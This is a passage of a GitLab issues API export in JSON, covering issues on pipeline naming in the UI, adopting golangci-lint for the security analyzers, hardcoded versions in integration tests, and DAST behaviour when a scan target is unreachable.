intelligence","priority::3","section::growth","severity::3","type::bug","workflow::verification"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"user_notes_count":5,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337497","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337497","notes":"https://gitlab.com/api/v4/projects/278964/issues/337497/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337497/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337497","relative":"#337497","full":"gitlab-org/gitlab#337497"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91353963,"iid":337496,"project_id":278964,"title":"Link pipeline by their name/commit name rather than ID in the UI","description":"## Update: This change was rolled back. See https://gitlab.com/gitlab-org/gitlab/-/issues/337496#note_852094210\n\n## 🧩 Problem\n\nPipelines are currently linked in some places in GitLab UI by their ID which doesn't help users differentiate between the jobs, it's not human readable.\n\n![image](/uploads/86c704433efc38b43c2389699517a77c/image.png)\n\n## ✨ Proposal\n\nUse pipeline commit message or names (once implemented) as the primary pipeline identifier in the UI and provide the pipeline ID as a secondary identifier. \n\n| - | Design |\n|---|--------|\n|Before| ![Screen_Shot_2022-02-14_at_2.33.40_PM](/uploads/f076392b11e58b6c26f942fd07cabc57/Screen_Shot_2022-02-14_at_2.33.40_PM.png) |\n| After | ![Screen_Shot_2022-02-14_at_2.31.56_PM](/uploads/4b0b1bc80605c8893e310be3a05f64f3/Screen_Shot_2022-02-14_at_2.31.56_PM.png) |\n\nSimilar to the work that was done in https://gitlab.com/gitlab-org/gitlab/-/issues/334349/","state":"closed","created_at":"2021-08-03T08:20:00.516Z","updated_at":"2022-05-16T07:08:59.000Z","closed_at":"2022-02-17T15:19:55.692Z","closed_by":{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"},"labels":["Category:Continuous Integration","UX","Verify candidate","auto updated","devops::verify","feature::enhancement","frontend","group::pipeline execution","section::ops","type::feature","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"}],"author":{"id":4509877,"username":"dhershkovitch","name":"Dov Hershkovitch","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7daa3113f0359f08a217fa800d9cc1d2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dhershkovitch"},"type":"ISSUE","assignee":{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"},"user_notes_count":26,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337496","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337496","notes":"https://gitlab.com/api/v4/projects/278964/issues/337496/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337496/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337496","relative":"#337496","full":"gitlab-org/gitlab#337496"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91351249,"iid":337493,"project_id":278964,"title":"Support multiple linters in secure analyzer projects by leveraging golangci-lint","description":"### Problem to solve \n\nSecure analyzer projects [previously used](https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/6fd1935d9392d88cfad73e7de1fc13ee33dcb4eb/includes-dev/go.yml#L21-25) [`golint`](https://github.com/golang/lint) for linting, however, due to the fact that it was deprecated, it was replaced with `go vet` in https://gitlab.com/gitlab-org/gitlab/-/issues/335715. Unfortunately `go vet` isn't a drop-in replacement for `golint`, since it doesn't implement the same checks. For example, we now lose enforcement of [Doc Comments](https://github.com/golang/go/wiki/CodeReviewComments#doc-comments):\n\n**Before switching from `golint` to `go vet`**\n\nExported vars/types/functions were required to have a comment:\n\n```\n$ mkdir golint-vs-go-vet \u0026\u0026 cd golint-vs-go-vet\n$ echo \"package main\\ntype Scan struct {\\n Scanner string\\n}\" \u003e main.go \u0026\u0026 golint ./...\n\nmain.go:2:6: exported type Scan should have comment or be unexported\n```\n\n**After switching from `golint` to `go vet`**\n\nThe previous example no longer fails:\n\n```\n$ go mod init \n$ go vet\n$ echo $?\n0\n```\n\nThere are other linters available, such as [staticcheck](https://staticcheck.io/docs/checks), which provide additional checks, although it still doesn't enforce comments on exported vars/types/functions, it only requires that if a comment exists, it must be formatted properly:\n\n```\n$ rm -f \"main.go\" \u0026\u0026 echo \"package main\\ntype Scan struct {\\n Scanner string\\n}\" \u003e main.go \u0026\u0026 staticcheck ./...\n$ echo $?\n0\n\n$ echo 'checks = [\"inherit\", \"ST1020\", \"ST1021\", \"ST1022\"]' \u003e staticcheck.conf\n$ rm -f \"main.go\" \u0026\u0026 echo \"package main\\n// random comment \\n type Scan struct {\\n Scanner string\\n}\" \u003e main.go \u0026\u0026 staticcheck ./...\n\nmain.go:2:1: comment on exported type Scan should be of the form \"Scan ...\" (with optional leading article) (ST1021)\n```\n\n### Proposal \n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for previous proposal\u003c/summary\u003e\n\nInstead of relying on only `go vet` or `staticcheck` for linting, we should run multiple linters using [golangci-lint](https://github.com/golangci/golangci-lint) like what [browserker does](https://gitlab.com/gitlab-org/security-products/analyzers/browserker/-/blob/f60d9069fc1e490b8b64ec446b4fc74439aba1d5/.golangci.yml#L52-64).\n\n1. [ ] Determine which linters to enable. `browserker` uses the following linters:\n\n   ```\n   - deadcode # Finds unused code\n   - errcheck # Errcheck is a program for checking for unchecked errors in go programs. These unchecked errors can be critical bugs in some cases\n   - gosimple # Linter for Go source code that specializes in simplifying a code\n   - govet # Vet examines Go source code and reports suspicious constructs, such as Printf calls whose arguments do not align with the format string\n   - ineffassign # Detects when assignments to existing variables are not used\n   - staticcheck # Staticcheck is a go vet on steroids, applying a ton of static analysis checks\n   - structcheck # Finds unused struct fields\n   - typecheck # Like the front-end of a Go compiler, parses and type-checks Go code\n   - unused # Checks Go code for unused constants, variables, functions and types\n   - varcheck # Finds unused global variables and constants\n   ```\n\n   However, the following linters are supported (run `golangci-lint linters` to obtain this list):\n\n   \u003cdetails\u003e\n   \u003csummary\u003eExpand for complete list of available linters\u003c/summary\u003e\n   \u003cpre\u003e\n   \n   ```\n   asciicheck: Simple linter to check that your code does not contain non-ASCII identifiers [fast: true, auto-fix: false]\n   bodyclose: checks whether HTTP response body is closed successfully [fast: false, auto-fix: false]\n   cyclop: checks function and package cyclomatic complexity [fast: false, auto-fix: false]\n   depguard: Go linter that checks if package imports are in a list of acceptable packages [fast: false, auto-fix: false]\n   dogsled: Checks assignments with too many blank identifiers (e.g. x, _, _, _, := f()) [fast: true, auto-fix: false]\n   dupl: Tool for code clone detection [fast: true, auto-fix: false]\n   durationcheck: check for two durations multiplied together [fast: false, auto-fix: false]\n   errorlint: go-errorlint is a source code linter for Go software that can be used to find code that will cause problems with the error wrapping scheme introduced in Go 1.13. [fast: false, auto-fix: false]\n   exhaustive: check exhaustiveness of enum switch statements [fast: false, auto-fix: false]\n   exhaustivestruct: Checks if all struct's fields are initialized [fast: false, auto-fix: false]\n   exportloopref: checks for pointers to enclosing loop variables [fast: false, auto-fix: false]\n   forbidigo: Forbids identifiers [fast: true, auto-fix: false]\n   forcetypeassert: finds forced type assertions [fast: true, auto-fix: false]\n   funlen: Tool for detection of long functions [fast: true, auto-fix: false]\n   gci: Gci control golang package import order and make it always deterministic. [fast: true, auto-fix: true]\n   gochecknoglobals: check that no global variables exist [fast: true, auto-fix: false]\n   gochecknoinits: Checks that no init functions are present in Go code [fast: true, auto-fix: false]\n   gocognit: Computes and checks the cognitive complexity of functions [fast: true, auto-fix: false]\n   goconst: Finds repeated strings that could be replaced by a constant [fast: true, auto-fix: false]\n   gocritic: Provides many diagnostics that check for bugs, performance and style issues. [fast: false, auto-fix: false]\n   gocyclo: Computes and checks the cyclomatic complexity of functions [fast: true, auto-fix: false]\n   godot: Check if comments end in a period [fast: true, auto-fix: true]\n   godox: Tool for detection of FIXME, TODO and other comment keywords [fast: true, auto-fix: false]\n   goerr113: Golang linter to check the errors handling expressions [fast: false, auto-fix: false]\n   gofmt: Gofmt checks whether code was gofmt-ed. By default this tool runs with -s option to check for code simplification [fast: true, auto-fix: true]\n   gofumpt: Gofumpt checks whether code was gofumpt-ed. [fast: true, auto-fix: true]\n   goheader: Checks is file header matches to pattern [fast: true, auto-fix: false]\n   goimports: Goimports does everything that gofmt does. Additionally it checks unused imports [fast: true, auto-fix: true]\n   golint: Golint differs from gofmt. Gofmt reformats Go source code, whereas golint prints out style mistakes [fast: false, auto-fix: false]\n   gomnd: An analyzer to detect magic numbers. [fast: true, auto-fix: false]\n   gomoddirectives: Manage the use of 'replace', 'retract', and 'excludes' directives in go.mod. [fast: true, auto-fix: false]\n   gomodguard: Allow and block list linter for direct Go module dependencies. This is different from depguard where there are different block types for example version constraints and module recommendations. [fast: true, auto-fix: false]\n   goprintffuncname: Checks that printf-like functions are named with `f` at the end [fast: true, auto-fix: false]\n   gosec (gas): Inspects source code for security problems [fast: false, auto-fix: false]\n   ifshort: Checks that your code uses short syntax for if-statements whenever possible [fast: true, auto-fix: false]\n   importas: Enforces consistent import aliases [fast: false, auto-fix: false]\n   interfacer: Linter that suggests narrower interface types [fast: false, auto-fix: false]\n   lll: Reports long lines [fast: true, auto-fix: false]\n   makezero: Finds slice declarations with non-zero initial length [fast: false, auto-fix: false]\n   maligned: Tool to detect Go structs that would take less memory if their fields were sorted [fast: false, auto-fix: false]\n   misspell: Finds commonly misspelled English words in comments [fast: true, auto-fix: true]\n   nakedret: Finds naked returns in functions greater than a specified function length [fast: true, auto-fix: false]\n   nestif: Reports deeply nested if statements [fast: true, auto-fix: false]\n   nilerr: Finds the code that returns nil even if it checks that the error is not nil. [fast: false, auto-fix: false]\n   nlreturn: nlreturn checks for a new line before return and branch statements to increase code clarity [fast: true, auto-fix: false]\n   noctx: noctx finds sending http request without context.Context [fast: false, auto-fix: false]\n   nolintlint: Reports ill-formed or insufficient nolint directives [fast: true, auto-fix: false]\n   paralleltest: paralleltest detects missing usage of t.Parallel() method in your Go test [fast: true, auto-fix: false]\n   prealloc: Finds slice declarations that could potentially be preallocated [fast: true, auto-fix: false]\n   predeclared: find code that shadows one of Go's predeclared identifiers [fast: true, auto-fix: false]\n   revive: Fast, configurable, extensible, flexible, and beautiful linter for Go. Drop-in replacement of golint. [fast: false, auto-fix: false]\n   rowserrcheck: checks whether Err of rows is checked successfully [fast: false, auto-fix: false]\n   scopelint: Scopelint checks for unpinned variables in go programs [fast: true, auto-fix: false]\n   sqlclosecheck: Checks that sql.Rows and sql.Stmt are closed. [fast: false, auto-fix: false]\n   stylecheck: Stylecheck is a replacement for golint [fast: false, auto-fix: false]\n   testpackage: linter that makes you use a separate _test package [fast: true, auto-fix: false]\n   thelper: thelper detects golang test helpers without t.Helper() call and checks the consistency of test helpers [fast: false, auto-fix: false]\n   tparallel: tparallel detects inappropriate usage of t.Parallel() method in your Go test codes [fast: false, auto-fix: false]\n   unconvert: Remove unnecessary type conversions [fast: false, auto-fix: false]\n   unparam: Reports unused function parameters [fast: false, auto-fix: false]\n   wastedassign: wastedassign finds wasted assignment statements. [fast: false, auto-fix: false]\n   whitespace: Tool for detection of leading and trailing whitespace [fast: true, auto-fix: true]\n   wrapcheck: Checks that errors returned from external packages are wrapped [fast: false, auto-fix: false]\n   wsl: Whitespace Linter - Forces you to use empty lines! [fast: true, auto-fix: false]\n   ```\n   \n   \u003c/pre\u003e\n   \u003c/details\u003e  \n\n   We may want to consult the `DAST` team to find out why they chose the linters that they did.\n\n1. [ ] Investigate whether any of the above linters will enforce [Doc Comments](https://github.com/golang/go/wiki/CodeReviewComments#doc-comments), like `golint` used to provide. While we're checking this, it would be useful to determine if any of the above linters will enforce go struct field comments, which would allow us to also close [this issue](https://gitlab.com/gitlab-org/gitlab/-/issues/246485).\n\n1. [ ] Determine which options to enable for each linter. For example, `staticcheck` supports [a large number of possible checks](https://staticcheck.io/docs/checks), so we may want to enable the following non-default checks:\n\n   - [`ST1020`](https://staticcheck.io/docs/checks#ST1020): The documentation of an exported function should start with the function's name\n   - [`ST1021`](https://staticcheck.io/docs/checks#ST1021): The documentation of an exported type should start with type's name\n   - [`ST1022`](https://staticcheck.io/docs/checks#ST1022): The documentation of an exported variable or constant should start with variable's name\n\n1. [ ] Update and rename the [`go vet`](https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/1ed3f323465de8d24415ad720ac47e1330d3d08b/includes-dev/go.yml#L21-25) job in the shared `ci-templates/includes-dev/go.yml` file to use `golangci-lint` and the configured linters.\n\n\u003c/details\u003e\n\n1. [x] Use [this MR](https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/253) as a starting point.\n1. [x] Rename the [`go vet`](https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/1ed3f323465de8d24415ad720ac47e1330d3d08b/includes-dev/go.yml#L21-25) job in the shared `ci-templates/includes-dev/go.yml` file to `go lint`. Update this job to use [`golangci-lint`](https://golangci-lint.run/usage/install/) and enable `go vet` and `revive` linters. Make sure the job has `allow_failure: true` configured.\n1. [x] Open an issue about updating the existing analyzer projects so that all the failing `go lint` jobs pass.\n   - [Ensure go lint passes for secure analyzers](https://gitlab.com/gitlab-org/gitlab/-/issues/345021)\n1. [x] Open an issue about enforcing the linters added in step `2.`, and make it blocked by the issues about conforming the analyzer projects in step `3.` above.\n   - [Disallow go lint to fail for security CI templates](https://gitlab.com/gitlab-org/gitlab/-/issues/337236)\n1. [ ] Set due date\n\n### User experience goal\n\nImproved code quality due to increased linting\n\n### What does success look like, and how can we measure that?\n\nSecure analyzers use multiple linting tools. Hopefully we can find a linting tool that will enforce comments on exported types/vars/functions\n\n### What is the type of buyer?\n\n~\"Enterprise Edition\" ~\"GitLab Ultimate\" \n\n### Is this a cross-stage feature?\n\nYes, this will affect Dependency Scanning and SAST\n\n/cc @gonzoyumo @NicoleSchwartz @dsearles","state":"closed","created_at":"2021-08-03T07:38:00.284Z","updated_at":"2022-03-16T11:39:54.967Z","closed_at":"2021-11-15T06:16:54.018Z","closed_by":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"labels":["Category:Dependency Scanning","Category:SAST","Category:Secret Detection","Deliverable","Enterprise Edition","GitLab Ultimate","backend","devops::secure","group::composition analysis","maintenance::refactor","maintenance::workflow","quad-planning::complete-no-action","section::sec","type::maintenance","workflow::production"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"}],"author":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"type":"ISSUE","assignee":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337493","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":9,"completed_count":4},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 9 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337493","notes":"https://gitlab.com/api/v4/projects/278964/issues/337493/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337493/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337493","relative":"#337493","full":"gitlab-org/gitlab#337493"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91334425,"iid":337490,"project_id":278964,"title":"Don't hardcode version number in secure analyzer image integration tests","description":"### Problem to solve\n\nThe image integration tests added to `gemnasium` in https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/merge_requests/194 include an [analyzer version check](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/513009c275d254ac1e2e2b6d8d1569d486471002/spec/image_spec.rb#L26-29):\n\n```ruby\nit \"outputs analyzer version\" do\n  analyzer_version = \"2.29.7\"\n  expect(@output).to match(/GitLab Gemnasium analyzer v#{analyzer_version}/i)\nend\n```\n\nThe addition of this test now requires that we update the analyzer version in two places when the changelog entry is updated:\n\n1. in the [`CHANGELOG.md`](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/master/CHANGELOG.md) file\n1. in the [`image_spec.rb`](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/242dd660948cab99468d4c9e29bf6877dd985dca/spec/image_spec.rb#L19-22) file\n\nIf we forget to update the `image_spec.rb` file, we end up with [a failure](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/jobs/1468899731):\n\n```\n  1) running image with no project outputs analyzer version\n     Failure/Error: expect(@output).to match(/GitLab Gemnasium analyzer v#{analyzer_version}/i)\n       expected \"\\e[0;32m[INFO] [Gemnasium] [2021-08-02T04:56:55Z] ▶ GitLab Gemnasium analyzer v2.29.9\\r\\n\\e[0m\\e[0;33m[WARN] [Gemnasium] [2021-08-02T04:56:55Z] ▶ No match in /app\\r\\n\\e[0m\" to match /GitLab Gemnasium analyzer v2.29.8/i\n       Diff:\n       @@ -1,3 +1,5 @@\n       -/GitLab Gemnasium analyzer v2.29.8/i\n       +[INFO] [Gemnasium] [2021-08-02T04:56:55Z] ▶ GitLab Gemnasium analyzer v2.29.9\n       +[WARN] [Gemnasium] [2021-08-02T04:56:55Z] ▶ No match in /app\n       +\n     # ./spec/image_spec.rb:21:in `block (3 levels) in \u003ctop (required)\u003e'\n```\n\n### Implementation plan\n\nIn order to avoid needing to remember to update the changelog version in two places, we need to complete the following steps:\n\n1. [ ] Figure out the best approach for ensuring that the version returned by the analyzer matches the most recent version in the `CHANGELOG.md` file.\n\n   This should be implemented in the [integration-test](https://gitlab.com/gitlab-org/security-products/analyzers/integration-test/) project using one of the following options:\n\n   - Add a new `changelog_version` method which will extract the most recent changelog version from the `CHANGELOG.md` file, similar to how this is done in the [Dockerfile](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/242dd660948cab99468d4c9e29bf6877dd985dca/Dockerfile#L9-11) (which was added as part of [Report changelog version in Go-based analyzers](https://gitlab.com/gitlab-org/gitlab/-/issues/225301)).\n\n     We can then compare the value returned by this `changelog_version` method against the one returned by the analyzer in the image integration tests for each project.\n\n     For example:\n\n     ```ruby\n     it \"outputs analyzer version\" do\n       changelog_version = GitlabSecure::IntegrationTest::Comparable.changelog_version\n       expect(@output).to match(/GitLab Gemnasium analyzer v#{changelog_version}/i)\n     end\n     ```\n\n     See [WIP: Add changelog_version method](https://gitlab.com/gitlab-org/security-products/analyzers/integration-test/-/merge_requests/8) as a starting point for this approach.\n\n   - Add a shared example which extracts the `changelog_version` _and_ compares it to the version returned by the analyzer. This would simplify and reduce duplication from the image integration tests in the analyzer projects since they can just reference this shared example which contains both the logic for extracting and comparing the version values.\n\n     For example:\n\n     ```ruby\n     it_behaves_like \"analyzer version matches changelog version\", \"GitLab Gemnasium analyzer\"\n     ```\n\n1. [ ] Update (or replace) the `outputs analyzer version` tests from the following projects to use the new code added in step `1.` above:\n   - [ ] [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/1772fee790900db4a985b9fec544881750184832/spec/image_spec.rb#L19-22)\n   - [ ] [gemnasium-python](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-python/-/blob/81d76474cffdc22bc68060f242878caf08a515e8/spec/image_spec.rb#L29-32)\n1. [ ] Add an `outputs analyzer version` test, implemented the same as in `gemnasium` and `gemnasium-python` above to the following project:\n   - [ ] [retire.js](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js/-/blob/421bb8a540129ef4d2828b4cd3ca0d41f96dafe0/spec/image_spec.rb)\n\n### User experience goal\n\nReduce maintenance cost and unnecessary test failures.\n\n### What does success look like, and how can we measure that?\n\nAnalyzer image integration tests don't hardcode the changelog version in the spec files, instead they use `GitlabSecure::IntegrationTest::Comparable.changelog_version` to automatically extract this information.\n\n### What is the type of buyer?\n\n~\"GitLab Ultimate\" ~\"Enterprise Applications\"\n\n### Is this a cross-stage feature?\n\nYes, this will affect all analyzers that make use of the [image integration test](https://gitlab.com/gitlab-org/security-products/analyzers/integration-test/) project\n\n/cc @gonzoyumo @NicoleSchwartz @fcatteau","state":"closed","created_at":"2021-08-03T06:58:58.400Z","updated_at":"2022-05-11T03:11:23.655Z","closed_at":"2022-05-05T11:32:51.360Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"labels":["Category:Dependency Scanning","Deliverable","Enterprise Edition","GitLab Ultimate","[deprecated] Accepting merge requests","backend","devops::secure","group::composition analysis","section::sec","test","type::maintenance","won't do","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"type":"ISSUE","assignee":null,"user_notes_count":17,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337490","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337490","notes":"https://gitlab.com/api/v4/projects/278964/issues/337490/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337490/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337490","relative":"#337490","full":"gitlab-org/gitlab#337490"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5823,"epic":{"id":255201,"iid":5823,"title":"Composition Analysis Testing improvements","url":"/groups/gitlab-org/-/epics/5823","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91309129,"iid":337482,"project_id":278964,"title":"DAST should Fail when the Target is not accessible","description":"### Problem to solve \n\nWhen DAST runs against a target that is not reachable, DAST outputs that the URL could not be reached and attempts to scan anyway. For example:\n\n```\nhttp://asodjfoa.example.com could not be reached, attempting scan anyway.\n```\nThis behavior is inconsistent since DAST stops and exits with code `1` when the site returns an error response.\nA job example with an unreachable URL can be found [here](https://gitlab.com/gitlab-gold/kategrechishkinatestgroup/226835-dast-multiple-jobs-testing/-/jobs/1464800359#L247).\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n\n### Proposal\n\nUpdate DAST to stop the scan and return exit code `1` when the target site can not be reached.\n\nCheck Browserker also stops the scan and exits with code `1` when the target can not be reached. \n\n### What is the type of buyer?\n\n[Gold/Ultimate](https://about.gitlab.com/handbook/product/pricing/#three-tiers)\n\n\u003c!-- Label reminders - you should have one of each of the following labels.\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2021-08-03T02:55:42.170Z","updated_at":"2021-08-13T01:27:11.515Z","closed_at":"2021-08-13T01:27:11.499Z","closed_by":{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"},"labels":["Category:DAST","auto updated","devops::secure","group::dynamic analysis","section::sec","type::feature","workflow::production"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"}],"author":{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"},"type":"ISSUE","assignee":{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"},"user_notes_count":3,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337482","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337482","notes":"https://gitlab.com/api/v4/projects/278964/issues/337482/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337482/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337482","relative":"#337482","full":"gitlab-org/gitlab#337482"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91304569,"iid":337473,"project_id":278964,"title":"SPIKE: Snowplow tracking in self-managed","description":"## Summary\n\nOur current usage tracking in self-managed instances is limited and do not allow us to understand user journeys. We'd like to explore implementing a service which picks up user-level ([de-identified](https://gitlab.com/groups/gitlab-org/-/epics/6309)) events which allows us to string together both frontend and backend events 